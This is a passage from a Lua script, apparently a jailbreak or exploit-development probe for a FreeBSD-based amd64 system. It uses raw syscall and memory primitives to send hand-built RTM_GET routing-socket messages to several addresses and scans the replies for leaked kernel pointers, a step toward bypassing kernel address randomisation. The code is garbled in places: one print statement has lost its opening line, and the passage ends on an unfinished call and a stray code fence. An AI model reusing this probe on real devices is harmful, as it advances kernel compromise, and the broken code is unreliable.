                    if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                        kptrs2 = kptrs2 + 1
                        print(string.format("  KPTR +0x%04X: %08X_%08X", off, h, l))
                    end
                end
            end
            print(string.format("  kernel pointers found: %d", kptrs2))

            print("")
            print("--- First 256 bytes ---")
            for row = 0, math.min(ilen - 1, 255), 16 do
                local hex = ""
                for col = 0, 15 do
                    if row + col < ilen then
                        local b = safe_rb(ifbuf + row + col)
                        if b then
                            hex = hex .. string.format("%02X ", b)
                        else
                            hex = hex .. "?? "
                        end
                    end
                end
                print(string.format("  +%04X: %s", row, hex))
            end
        end
    end

    print("")
    print("=== PROBE 43o COMPLETE (sysctl fallback) ===")
    return
end

print("")
print("--- STEP 2: Build RTM_GET message ---")

-- struct rt_msghdr is ~92 bytes on FreeBSD amd64
-- struct sockaddr_in is 16 bytes
local RTM_VERSION = 5
local RTF_UP = 0x1
local RTF_GATEWAY = 0x2

local msglen = 128  -- rt_msghdr + sockaddr_in for dst
local msg = memory.alloc(msglen + 64)

-- Zero it
for i = 0, msglen - 1 do
    safe_wb(msg + i, 0)
end

-- rt_msghdr fields (FreeBSD amd64):
-- +0x00: u_short rtm_msglen
-- +0x02: u_char  rtm_version
-- +0x03: u_char  rtm_type
-- +0x04: u_short rtm_index
-- +0x08: int     rtm_flags
-- +0x0C: int     rtm_addrs
-- +0x10: pid_t   rtm_pid
-- +0x14: int     rtm_seq
-- +0x18: int     rtm_errno
-- +0x1C: int     rtm_fmask
-- +0x20: u_long  rtm_inits  (8 bytes on amd64)
-- +0x28: struct rt_metrics (starts here)
-- Total header ~92 bytes, but align to 96

local HDR_SIZE = 92

-- Fill header
safe_wd(msg, HDR_SIZE + 16)         -- rtm_msglen (header + 1 sockaddr_in)
safe_wb(msg + 2, RTM_VERSION)        -- rtm_version = 5
safe_wb(msg + 3, RTM_GET)           -- rtm_type = RTM_GET
safe_wd(msg + 8, RTF_UP + RTF_GATEWAY) -- rtm_flags
safe_wd(msg + 0x0C, 0x01)           -- rtm_addrs = RTA_DST
safe_wd(msg + 0x14, 1)              -- rtm_seq = 1

-- sockaddr_in for destination (default route 0.0.0.0)
local sa_off = HDR_SIZE
safe_wb(msg + sa_off, 16)           -- sin_len = 16
safe_wb(msg + sa_off + 1, AF_INET)  -- sin_family = AF_INET
-- sin_port = 0, sin_addr = 0.0.0.0 (default route)

local total_len = HDR_SIZE + 16

-- Update msglen
safe_wb(msg, total_len % 256)
safe_wb(msg + 1, math.floor(total_len / 256))

print(string.format("  RTM_GET message built: %d bytes", total_len))
print(string.format("  Sending to fd=%d...", rfd))

-- === STEP 3: Send RTM_GET ===
local ok_w, ret_w = pcall(function()
    return sc_write(uint64(rfd), uint64(msg), uint64(total_len),
        uint64(0), uint64(0), uint64(0))
end)
if not ok_w then
    print("  write CRASHED")
else
    print(string.format("  write ret=%d", to_num(ret_w)))
end

-- === STEP 4: Read response ===
print("")
print("--- STEP 3: Read response ---")
local rbuf = memory.alloc(4096)
for i = 0, 255 do safe_wb(rbuf + i, 0) end

local ok_r, ret_r = pcall(function()
    return sc_read(uint64(rfd), uint64(rbuf), uint64(4096),
        uint64(0), uint64(0), uint64(0))
end)
if not ok_r then
    print("  read CRASHED")
else
    local rlen = to_num(ret_r)
    print(string.format("  read ret=%d bytes", rlen))

    if rlen > 0 then
        -- Scan for kernel pointers
        print("")
        print("--- KERNEL POINTER SCAN ---")
        local kptrs = 0
        for off = 0, rlen - 8, 8 do
            local val = safe_rq(rbuf + off)
            if val then
                local h, l = get_hi_lo(val)
                if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                    kptrs = kptrs + 1
                    print(string.format("  KPTR +0x%03X: %08X_%08X", off, h, l))
                end
            end
        end
        print(string.format("  kernel pointers found: %d", kptrs))

        -- Full hex dump
        print("")
        print("--- Response hex dump ---")
        for row = 0, math.min(rlen - 1, 511), 16 do
            local hex = ""
            for col = 0, 15 do
                if row + col < rlen then
                    local b = safe_rb(rbuf + row + col)
                    if b then
                        hex = hex .. string.format("%02X ", b)
                    else
                        hex = hex .. "?? "
                    end
                end
            end
            print(string.format("  +%03X: %s", row, hex))
        end

        -- Parse rt_msghdr fields from response
        print("")
        print("--- Response header ---")
        local resp_len = (safe_rb(rbuf + 1) or 0) * 256 + (safe_rb(rbuf) or 0)
        local resp_ver = safe_rb(rbuf + 2) or 0
        local resp_type = safe_rb(rbuf + 3) or 0
        local resp_flags = safe_rd(rbuf + 8) or 0
        local resp_addrs = safe_rd(rbuf + 0x0C) or 0
        local resp_errno = safe_rd(rbuf + 0x18) or 0
        print(string.format("  msglen=%d ver=%d type=%d flags=0x%X addrs=0x%X errno=%d",
            resp_len, resp_ver, resp_type, resp_flags, resp_addrs, resp_errno))
    end
end

-- === STEP 5: Try RTM_GET for specific destinations ===
print("")
print("--- STEP 4: RTM_GET for specific destinations ---")
local targets = {
    {127, 0, 0, 1, "loopback"},
    {10, 0, 0, 1, "gateway"},
    {10, 0, 0, 96, "self"},
    {255, 255, 255, 255, "broadcast"},
    {8, 8, 8, 8, "dns"},
}

for _, tgt in ipairs(targets) do
    for i = 0, msglen - 1 do safe_wb(msg + i, 0) end

    safe_wb(msg, total_len % 256)
    safe_wb(msg + 1, math.floor(total_len / 256))
    safe_wb(msg + 2, RTM_VERSION)
    safe_wb(msg + 3, RTM_GET)
    safe_wd(msg + 8, RTF_UP)
    safe_wd(msg + 0x0C, 0x01)  -- RTA_DST
    safe_wd(msg + 0x14, 2)     -- seq=2+

    safe_wb(msg + sa_off, 16)
    safe_wb(msg + sa_off + 1, AF_INET)
    safe_wb(msg + sa_off + 4, tgt[1])
    safe_wb(msg + sa_off + 5, tgt[2])
    safe_wb(msg + sa_off + 6, tgt[3])
    safe_wb(msg + sa_off + 7, tgt[4])

    local ok_w2, ret_w2 = pcall(function()
        return sc_write(uint64(rfd), uint64(msg), uint64(total_len),
            uint64(0), uint64(0), uint64(0))
    end)

    if ok_w2 and to_num(ret_w2) > 0 then
        for i = 0, 511 do safe_wb(rbuf + i, 0) end
        local ok_r2, ret_r2 = pcall(function()
            return sc_read(uint64(rfd), uint64(rbuf), uint64(4096),
                uint64(0), uint64(0), uint64(0))
        end)

        if ok_r2 then
            local rlen2 = to_num(ret_r2)
            local kp = 0
            if rlen2 > 0 then
                for off = 0, rlen2 - 8, 8 do
                    local val = safe_rq(rbuf + off)
                    if val then
                        local h, l = get_hi_lo(val)
                        if h >= 0xFFFF8000 and h ~= 0xFFFFFFFF then
                            kp = kp + 1

                                tgt[5], off, h, l))
                        end
                    end
                end
            end
            print(string.format("  %s: %d bytes, %d kptrs", tgt[5], rlen2, kp))
        else
            print(string.format("  %s: read CRASHED", tgt[5]))
        end
    else
        print(string.format("  %s: write failed", tgt[5]))
    end
end

-- === STEP 6: Try reading without writing (catch broadcast messages) ===

pcall(function()
```
